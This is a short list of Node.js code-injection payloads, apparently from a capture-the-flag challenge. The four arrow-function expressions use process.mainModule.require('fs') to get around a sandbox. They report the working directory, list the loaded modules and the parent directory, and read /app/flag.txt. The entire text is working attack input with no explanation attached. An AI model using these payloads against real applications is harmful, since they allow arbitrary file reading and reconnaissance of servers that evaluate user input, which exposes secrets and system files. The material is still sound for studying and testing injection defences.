(a => process.cwd())()

(a => process.mainModule.children.map(child => child.filename))()
(a => process.mainModule.require('fs').readdirSync('/app/..'))()
(a => process.mainModule.require('fs').readFileSync('/app/flag.txt', 'utf-8'))()
